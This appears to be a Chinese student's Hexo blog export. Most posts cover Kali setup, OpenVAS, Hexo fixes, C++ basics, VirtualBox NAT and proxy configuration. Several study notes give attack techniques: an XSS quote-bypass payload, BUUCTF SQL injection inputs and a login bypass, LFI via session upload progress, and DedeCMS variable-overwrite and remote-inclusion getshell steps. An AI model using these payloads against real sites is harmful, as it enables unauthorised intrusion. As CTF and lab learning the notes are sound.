<ul>
<li><p>升级和更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br><span class="line">sudo apt dist-upgrade</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装完整工具包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install kali-linux-large</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h3 id="常见问题处理"><a href="#常见问题处理" class="headerlink" title="常见问题处理"></a>常见问题处理</h3><ul>
<li>全屏问题</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-cache search linux-image</span><br><span class="line">sudo apt install linux-header-5.5.0-kaili2-amd64 &lt;- 这步很重要</span><br><span class="line">cd /media/cdrom0</span><br><span class="line">sudo bash VBoxLinuxAddition.run</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/kali2020%E6%96%B0%E7%89%B9%E6%80%A7/D:%5Cblog%5Csource_posts%5Ckali2020%E6%96%B0%E7%89%B9%E6%80%A7%5Cimage-20200512215133919.png" alt="image-20200512215133919"></p>
<ul>
<li>中文输入法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install fcitx</span><br><span class="line">sudo apt install fcitx-libpinyin</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>



<p>向导模式改专家模式</p>
]]></content>
      <tags>
        <tag>course</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/05/05/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>openvas</title>
    <url>/2020/05/23/openvas/</url>
    <content><![CDATA[<h1 id="认识漏洞"><a href="#认识漏洞" class="headerlink" title="认识漏洞"></a>认识漏洞</h1><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>大家都知道的破窟窿</p>
<p>网安工作流程：发现设备 -&gt; 找到弱点 -&gt; 分析弱点 -&gt; 利用弱点 -&gt; 实现目的 </p>
<p>地位：“弱点” 整个工作流程的核心环节</p>
<ul>
<li>案例演示（nmap）<ul>
<li>598脚本，105弱点脚本<ul>
<li>cd /usr/share/nmap/scripts</li>
<li>less script.db | wc -l</li>
<li>less script.db | grep vuln | wc -l</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>ms08-067</p>
<p>引出一个问题：</p>
<p>​    我怎么知道ms08-067是干嘛用的</p>
<p>​    世界上有多少漏洞</p>
<h3 id="漏洞处理的常规思路"><a href="#漏洞处理的常规思路" class="headerlink" title="漏洞处理的常规思路"></a>漏洞处理的常规思路</h3><ul>
<li><p>基于单口的服务扫描-&gt;版本信息-&gt;官网上查找版本的补丁升级信息</p>
<ul>
<li>缺点：阅读 大量文档 人工理解 人工整理 工作量巨大而且不可能掌握所有</li>
</ul>
</li>
<li><p>搜索已经公开的漏洞数据 学习</p>
<ul>
<li>网站：exploit-db.com</li>
<li>kali集成了该网站的所有数据 <ul>
<li>cd /usr/share/exploitdb/shellcodes</li>
<li>searchsploit</li>
</ul>
</li>
</ul>
</li>
<li><p>还是不知道世界上有多少漏洞？</p>
</li>
<li><p>1个漏洞-&gt; 成千上亿 “过程”——》“体系化”</p>
</li>
</ul>
<h3 id="漏洞系统化管理"><a href="#漏洞系统化管理" class="headerlink" title="漏洞系统化管理"></a>漏洞系统化管理</h3><ul>
<li>发现漏洞——跟踪漏洞（能力：自定义配置扫描 跟踪轨迹）—— </li>
<li>分析漏洞——要能管理——能力：资产分组 制定所有者 。。。编制漏洞网</li>
<li>输出漏洞——要能向不同层级人群展示漏洞——能力：到处报告的能力。。与接口集成</li>
<li>工作效率——能快准狠——能力：准确性 时间 资源</li>
</ul>
<h3 id="漏扫行业（所有名词必须掌握）"><a href="#漏扫行业（所有名词必须掌握）" class="headerlink" title="漏扫行业（所有名词必须掌握）"></a>漏扫行业（所有名词必须掌握）</h3><ul>
<li>[评分]CVSS（Common vulnerability scoring system）通用的漏洞评分系统 度量标准</li>
</ul>
<p><img src="/2020/05/23/openvas/D:%5Cblog%5Csource_posts%5Copenvas%5Cimage-20200523220212625.png" alt="image-20200523220212625"></p>
<ul>
<li>CVE 公开的信息安全漏洞字典</li>
</ul>
<p><img src="/2020/05/23/openvas/D:%5Cblog%5Csource_posts%5Copenvas%5Cimage-20200523222544830.png" alt="image-20200523222544830"></p>
<p><img src="/2020/05/23/openvas/D:%5Cblog%5Csource_posts%5Copenvas%5Cimage-20200523223108065.png" alt="image-20200523223108065"></p>
<p>apt install openvas</p>
<p>openvas-setup</p>
<p>openvas-check-setup</p>
<p>openvasmd –get-users</p>
<p>openvasmd –user=admin –new-password=admin</p>
<p> win 下载 chocolate</p>
<p>openvas-start之后再同步</p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo无法deploy</title>
    <url>/2020/05/13/hexo%E6%97%A0%E6%B3%95deploy/</url>
    <content><![CDATA[<h1 id="hexo-无法deploy"><a href="#hexo-无法deploy" class="headerlink" title="hexo 无法deploy"></a>hexo 无法deploy</h1><h3 id="和github链接状态有关"><a href="#和github链接状态有关" class="headerlink" title="和github链接状态有关"></a>和github链接状态有关</h3><p>解决方法是删除.deploy（或者.deploy_git）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf .deploy_git</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<p>注意先hexo g再hexo d，如果还是不行<strong>尝试先clean一下</strong>。这个问题也可能和GitHub的链接状态有关。具体参考：</p>
<p><a href="https://link.zhihu.com/?target=https%3A//github.com/hexojs/hexo/issues/67">Hexo deploy 发布不成功 · Issue #67 · hexojs/hexo · GitHub</a><a href="https://link.zhihu.com/?target=https%3A//github.com/hexojs/hexo/issues/1272">use $: hexo g d  can’t deploy to server sometimes  · Issue #1272 · hexojs/hexo · GitHub</a>——————————————————————————————</p>
<p>In most cases, a simple Google will do the trick :-)</p>
<h3 id="和-post里md文件的标签有关"><a href="#和-post里md文件的标签有关" class="headerlink" title="和_post里md文件的标签有关"></a>和_post里md文件的标签有关</h3><p>标签后面的冒号要加空格 否则无法上传</p>
<p>e.g. </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tags: hexo</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>函数调用机制</title>
    <url>/2020/05/16/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h3 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h3><p>​     调用函数，就是将程序的<strong>执行控制权</strong>从<strong>调用者</strong>（某个函数）交给<strong>被调用的函数</strong>，同时通过参数向被调用的函数传递数据，然后程序进入被调用函数内部，执行函数定义中的代码获得结果数据，函数体代码执行完毕后再将控制权交回给调用者同时将结果数据通过返回值传递给调用者，作为整个函数调用表达式的值。简而言之，调用函数也就是执行函数中的代码，完成函数的功能。 </p>
<p>​     在实际的开发中，可供直接调用的现成函数主要有<strong>编译器提供的标准库函数</strong>、<strong>操作系统提供的API函数</strong>及<strong>第三方提供的函数库（如OpenGL）</strong>等，如图5-3所示。</p>
<p>​          <img src="/2020/05/16/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%9C%BA%E5%88%B6/D:%5Cblog%5Csource_posts%5C%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%9C%BA%E5%88%B6%5C151926479064933.png" alt="img">   </p>
<p>有了他人提供的函数，就可以直接调用这些函数来完成自己的功能。可以通过下面的形式来调用一个函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回值变量 &#x3D; 函数名(参数);</span><br></pre></td></tr></table></figure>

<p>这就是一个简单的函数调用语句，其中，用返回值变量来保存函数执行完毕后的返回值，如果函数的返回值类型为void，或者是我们不需要保存函数的返回值，则这个变量及其后面的“=”可以省略。整个函数调用语句的核心是用“函数名()”的形式所表达的对一个函数的调用。如果我们想调用某个函数，那就在其函数名之后加上一对小括号“()”表示对它的调用。如果这个函数的声明中有<strong>形式参数</strong>，那就按照函数声明中的参数类型和顺序，将实际的参数分别依次放到函数名之后的括号中，并用逗号间隔，形成函数调用的实际参数。通过这样的形式，就可以实现对一个函数的调用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用1和2作为实际参数，实现对Add()函数的调用</span></span><br><span class="line"><span class="comment">// 返回值保存到nRes（返回变量）中</span></span><br><span class="line"><span class="keyword">int</span> nRes = Add(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>这行代码就实现了对Add()函数的调用，它所表达的意义是，以1和2这两个数据作为实际参数调用Add()函数，然后程序进入Add()函数执行具体的计算，执行完毕后将执行结果保存到nRes变量中。这样，我们只需要简单地调用Add()函数，就得到了1和2两个数加法运算的结果3。至于具体的运算过程，可以交给Add()函数去处理，无需我们操心。</p>
]]></content>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>nat network 和 nat 的区别</title>
    <url>/2020/05/14/nat-network-%E5%92%8C-nat-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="Virtualbox中Nat和Nat-Network模式区别？"><a href="#Virtualbox中Nat和Nat-Network模式区别？" class="headerlink" title="Virtualbox中Nat和Nat Network模式区别？"></a>Virtualbox中Nat和Nat Network模式区别？</h1><h3 id="NAT是什么"><a href="#NAT是什么" class="headerlink" title="NAT是什么"></a>NAT是什么</h3><p>​    首先要弄明白什么是 NAT（<code>network address translation</code> 网络地址转换），就是将虚机所在网段的私有 IP（例如 <code>10.15.0.2</code>）转换为宿主机的所在网段的 IP（ 例如 <code>192.168.31.15</code>）然后通过<strong>宿主机</strong>来访问互联网，当然宿主机所在网段也是私有的，它会继续向上层（比如 家庭/公司路由器）请求 NAT，一层一层转换，直到数据传送到公网可见的网络设备。</p>
<p>​    在 NAT 模式下，<strong>所有的虚机的 IP 都是相同的</strong>，因为他们的网络接口（命令：<code>ip addr show</code>）不是相通的，没有一个公共的网关，只是简单做了虚机到宿主的 NAT，而 NAT network 则是有公共网关（可以理解为路由器）的，所以这种模式下，所有虚机在同一个网段下，既可以互相通信又可以访问互联网。</p>
<p> <img src="/2020/05/14/nat-network-%E5%92%8C-nat-%E7%9A%84%E5%8C%BA%E5%88%AB/D:%5Cblog%5Csource_posts%5Cnat-network-%E5%92%8C-nat-%E7%9A%84%E5%8C%BA%E5%88%AB%5C160926204664451.png" alt="NAT模式"> </p>
<h3 id="vbnat的两种模式"><a href="#vbnat的两种模式" class="headerlink" title="vbnat的两种模式"></a>vbnat的两种模式</h3><p>​    Virtualbox中Nat模式有两种，这里有NAT和NAT network两种模式对于前者，<strong>NAT模式是无法在两个虚拟机之间互相ping通的但是可以设置端口映射出去</strong>，也就是通过端口映射，可以让物理机访问到虚拟机。<br>​    而Nat network模式则是为了让不同的虚拟机之间进行访问但是却没有了端口映射，有点类似Host-only的模式的感觉。（主机不能ping通虚拟机）</p>
]]></content>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>如何学习网安</title>
    <url>/2020/05/07/%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0%E7%BD%91%E5%AE%89/</url>
    <content><![CDATA[<h1 id="网络安全到底怎么学"><a href="#网络安全到底怎么学" class="headerlink" title="网络安全到底怎么学"></a>网络安全到底怎么学</h1><p>技术手段？</p>
<table>
<thead>
<tr>
<th>攻击前</th>
<th>攻击中</th>
<th>攻击后</th>
</tr>
</thead>
<tbody><tr>
<td>对互联网的理解<br>就对互联网挖坑的人理解有多少<br>获取信息的能力<br></td>
<td>。。。</td>
<td>管好自己的电脑</td>
</tr>
</tbody></table>
<p>网络安全： 思维方式</p>
<p>自己的电脑管理方式： 集中式管理 分布式管理</p>
<p>网络： <strong>生活方式</strong></p>
<p>安全： <strong>生态体系</strong></p>
<h3 id="网络：生活方式"><a href="#网络：生活方式" class="headerlink" title="网络：生活方式"></a>网络：生活方式</h3><p>网络的历史： 还是基于互联网</p>
<p>电话网络</p>
<p>互联网： 生活在互联网</p>
<p><strong>OSI七层</strong>： 信息不对称 最好英文搜</p>
<p>每个人都可以从不同角度和出发点去玩</p>
<p>培养互联网生存能力</p>
<p>kali2020新特性</p>
<ul>
<li>黑客的起源（电话线）</li>
<li>黑客的文化（信息自由 信息平等）</li>
</ul>
<h3 id="安全：-生态体系"><a href="#安全：-生态体系" class="headerlink" title="安全： 生态体系"></a>安全： 生态体系</h3><p>互联网的生态： 谁在管理电脑</p>
<p><strong>渗透学科</strong> 和 <strong>网络安全</strong></p>
<p>《增长黑客》</p>
<p>kali2020（工具集）</p>
<p>可能不是专门的渗透系统 专门的生态系统</p>
<h3 id="怎么学"><a href="#怎么学" class="headerlink" title="怎么学"></a>怎么学</h3><p><strong>网感</strong></p>
<p>内化的思维</p>
<p><code>*内化*是将看、听、想等思维观点经过内证实践，所领悟出的具有客观价值的认知体系。*内化*通过“同化”和“顺应”两种机制来完成。*内化*对于德育工作具有重要的指导意义。 [加个升华]</code></p>
<p>不能以科技产品的方式攻击科技产品</p>
<p>要在生态体系下学习</p>
<p><strong>自己给自己营造环境</strong>！！to outside</p>
]]></content>
      <tags>
        <tag>学习目标</tag>
      </tags>
  </entry>
  <entry>
    <title>终端走代理的几种方法</title>
    <url>/2020/05/15/%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="让终端走代理的几种方法"><a href="#让终端走代理的几种方法" class="headerlink" title="让终端走代理的几种方法"></a>让终端走代理的几种方法</h1><ul>
<li><a href="https://blog.fazero.me/tags/Mac/" target="_blank" rel="noopener">Mac</a></li>
<li><a href="https://blog.fazero.me/tags/proxy/" target="_blank" rel="noopener">proxy</a></li>
<li><a href="https://blog.fazero.me/tags/terminal/" target="_blank" rel="noopener">terminal</a></li>
</ul>
<p>（2017.9.17更新）</p>
<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1:"></a>方法1:</h4><p>在终端中直接运行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=http://proxyAddress:port</span><br></pre></td></tr></table></figure>

<p>这个办法的好处是简单直接，并且影响面很小（只对当前终端有效，退出就不行了）。</p>
<p>如果你用的是ss代理，在当前终端运行以下命令，那么<code>wget</code> <code>curl</code> 这类网络命令都会经过ss代理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>

<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2:"></a>方法2:</h4><p>把代理服务器地址写入shell配置文件<code>.bashrc</code>或者<code>.zshrc</code></p>
<p>直接在<code>.bashrc</code>或者<code>.zshrc</code>添加下面内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy="http://localhost:port"</span><br><span class="line">export https_proxy="http://localhost:port"</span><br></pre></td></tr></table></figure>

<p>以使用shadowsocks代理为例，ss的代理端口为<code>1080</code>,那么应该设置为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy="socks5://127.0.0.1:1080"</span><br><span class="line">export https_proxy="socks5://127.0.0.1:1080"</span><br><span class="line"><span class="meta">#</span><span class="bash">kali2020命令行下推荐用这两条</span></span><br></pre></td></tr></table></figure>

<p>或者直接设置ALL_PROXY</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>

<p><code>localhost</code>就是一个域名，域名默认指向 <code>127.0.0.1</code>，两者是一样的。</p>
<p>然后<code>ESC</code>后<code>:wq</code>保存文件，接着在终端中执行<br><code>source ~/.bashrc</code></p>
<p>或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。</p>
<p>或者通过设置alias简写来简化操作，每次要用的时候输入<code>setproxy</code>，不用了就<code>unsetproxy</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias setproxy="export http_proxy='socks5://127.0.0.1:10079';export https_proxy='socks5://127.0.0.1:10079'"</span><br><span class="line">alias unsetproxy="unset ALL_PROXY"</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>

<h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3:"></a>方法3:</h4><p>改相应工具的配置，比如<code>apt</code>的配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/apt.conf</span><br></pre></td></tr></table></figure>

<p>在文件末尾加入下面这行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Acquire::http::Proxy "http://proxyAddress:port"</span><br></pre></td></tr></table></figure>

<p>保存<code>apt.conf</code>文件即可。<br>关于<code>apt</code>的代理设置可以参考<a href="https://askubuntu.com/questions/349702/apt-conf-acquirehttpproxy-proxyserverport-seems-not-to-be-used-ubuntu-13" target="_blank" rel="noopener">这里</a></p>
<p>关于git的代理设置看这里:<a href="https://blog.fazero.me/2015/07/11/用shadowsocks加速git-clone/" target="_blank" rel="noopener">用shadowsocks加速git clone</a></p>
<h4 id="方法4-推荐"><a href="#方法4-推荐" class="headerlink" title="方法4(推荐):"></a>方法4(推荐):</h4><p><a href="https://blog.fazero.me/2015/08/31/利用proxychains在终端使用socks5代理/" target="_blank" rel="noopener">利用proxychains在终端使用socks5代理</a></p>
<h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>如果代理服务器需要登陆，这时可以直接把用户名和密码写进去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http_proxy&#x3D;http:&#x2F;&#x2F;userName:password@proxyAddress:port</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>cms二次开发/cms二次开发</title>
    <url>/2020/10/13/cms%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/cms%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>ZVuln/ZVuln</title>
    <url>/2020/10/12/ZVuln/ZVuln/</url>
    <content><![CDATA[<p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012111641308.png" alt="image-20201012111641308"></p>
<p>使用新版本的mysqli_real_escape_string【注意事项就是前面要加一个mysql的link】，会把特殊字符过滤。</p>
<h4 id="反射性xss之‘-bypass"><a href="#反射性xss之‘-bypass" class="headerlink" title="反射性xss之‘ bypass"></a>反射性xss之‘ bypass</h4><p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012114120292.png" alt="image-20201012114120292"></p>
<p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012115526153.png" alt="image-20201012115526153"></p>
<p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012115739308.png" alt="image-20201012115739308"></p>
<p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012115803027.png" alt="image-20201012115803027"></p>
<p>利用条件比较苛刻 value必须用单引号包裹住。构造1’ onmouserover = alert(1)’</p>
<p>就会变成value = ‘1’ onmouserover = alert(1) ‘’ 成功利用</p>
<p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012120152357.png" alt="image-20201012120152357"></p>
<p>另外介绍一个htmlentities函数。</p>
<h4 id="csrf漏洞"><a href="#csrf漏洞" class="headerlink" title="csrf漏洞"></a>csrf漏洞</h4><p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012142855903.png" alt="image-20201012142855903"></p>
<p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012142916264.png" alt="image-20201012142916264"></p>
<h5 id="get请求的csrf请求伪造"><a href="#get请求的csrf请求伪造" class="headerlink" title="get请求的csrf请求伪造"></a>get请求的csrf请求伪造</h5><p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012145853619.png" alt="image-20201012145853619"></p>
<h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p><img src="/2020/10/12/ZVuln/ZVuln/E:%5Cblog%5Csource_posts%5CZVuln%5Cimage-20201012161045361.png" alt="image-20201012161045361"></p>
<p>服务器端的session进行校验。不是get或者post请求。所以这里是不存在越权的</p>
]]></content>
  </entry>
  <entry>
    <title>LFI</title>
    <url>/2020/10/13/LFI/LFI/</url>
    <content><![CDATA[<h4 id="有关session-upload-progress-cleanup"><a href="#有关session-upload-progress-cleanup" class="headerlink" title="有关session.upload_progress.cleanup"></a>有关session.upload_progress.cleanup</h4><p><img src="/2020/10/13/LFI/LFI/E:%5Cblog%5Csource_posts%5CLFI%5Cimage-20201012220602708.png" alt="image-20201012220602708"></p>
<p><img src="/2020/10/13/LFI/LFI/E:%5Cblog%5Csource_posts%5CLFI%5Cimage-20201012220521041.png" alt="image-20201012220521041"></p>
<p><img src="/2020/10/13/LFI/LFI/E:%5Cblog%5Csource_posts%5CLFI%5Cimage-20201012220512369.png" alt="image-20201012220512369"></p>
<p>2</p>
<p><img src="/2020/10/13/LFI/LFI/E:%5Cblog%5Csource_posts%5CLFI%5Cimage-20201013103457882.png" alt="image-20201013103457882"></p>
<p>自定义PHPSESSID然后tmp文件中存在我的sess（#的地方很好奇我是手动添加上去的 不知道是是什么原因。）</p>
<p><img src="/2020/10/13/LFI/LFI/E:%5Cblog%5Csource_posts%5CLFI%5Cimage-20201013104927452.png" alt="image-20201013104927452"></p>
<p>inputtype这里有个name就可以在数据包里有submit</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php序列化杂记</title>
    <url>/2020/05/10/buuweb/buuweb/</url>
    <content><![CDATA[<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011145420684.png" alt="image-20201011145420684"></p>
<p>解法1<br>输入的内容为<em>,1<br>内置的sql语句为s q l = “ s e l e c t “ . sql = “select “.<em>s*</em>q**l</em>=”<em>s<strong>e</strong>l<strong>e</strong>c**t</em>“.post[‘query’].”||flag from Flag”;<br>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
<p>解法2<br>输入的内容为1;set sql_mode=pipes_as_concat;select 1<br>其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串，这是我在本地做的测试，我们执行的语句分别为select 1和set sql_mode=pipes_as_concat和select 1||flag from Flag，读出flag</p>
<p><a href="https://blog.csdn.net/weixin_42373127/article/details/88866710" target="_blank" rel="noopener">sql_mode参数详解</a></p>
<h3 id="EasySQL极客大挑战"><a href="#EasySQL极客大挑战" class="headerlink" title="EasySQL极客大挑战"></a>EasySQL极客大挑战</h3><p>1、试了一下万能密码（v1rus’=’）成功：</p>
<p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011151144982.png" alt="image-20201011151144982"></p>
<p>2、试一下注入</p>
<p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011151557602.png" alt="image-20201011151557602"></p>
<p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011151543439.png" alt="image-20201011151543439"></p>
<p>都可以登录</p>
<h3 id="Have-Fun"><a href="#Have-Fun" class="headerlink" title="Have Fun"></a>Have Fun</h3><p>?cat=dog</p>
<p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011153948572.png" alt="image-20201011153948572"></p>
<p>可以测试xss。</p>
<p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011154256963.png" alt="image-20201011154256963"></p>
<p>不会报错。</p>
<h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011155302519.png" alt="image-20201011155302519"></p>
<p>消息体被注释了最好抓包查看</p>
<p><img src="/2020/05/10/buuweb/buuweb/E:%5Cblog%5Csource_posts%5Cbuuweb%5Cimage-20201011155329804.png" alt="image-20201011155329804"></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>dedecms漏洞</title>
    <url>/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="3-1-Dedecms重装下载漏洞"><a href="#3-1-Dedecms重装下载漏洞" class="headerlink" title="3-1 Dedecms重装下载漏洞"></a>3-1 Dedecms重装下载漏洞</h3><p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201016215511318.png" alt="image-20201016215511318"></p>
<p>利用apache解析漏洞执行install.php。但是存在文件的验证问题，再利用foreach函数变量覆盖的问题bypass。</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201016220625129.png" alt="image-20201016220625129"></p>
<p>重装的时候把数据库建立在远程。拿到后台管理员再拿shell</p>
<h3 id="3-2-Dedecms远程文件包含getshell"><a href="#3-2-Dedecms远程文件包含getshell" class="headerlink" title="3-2 Dedecms远程文件包含getshell"></a>3-2 Dedecms远程文件包含getshell</h3><p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017140038424.png" alt="image-20201017140038424"></p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017141401598.png" alt="完整过程"></p>
<p>step=11进入函数体,islockfile为a，<strong>$s_lang</strong>重写导致获取的$rmurl = $updateHost(这个再覆盖)/demodata.a(<strong>$s_lang</strong>).txt</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017142103979.png" alt="image-20201017142103979"></p>
<p>重写<strong>$s_lang</strong>这个变量导致第二步远程下载的织梦官网这个文件不存在$sql_content = file_get_contents($rmurl)[织梦官网/dedecms/demodata.a.txt]于是覆盖了$install_demo_name变量</p>
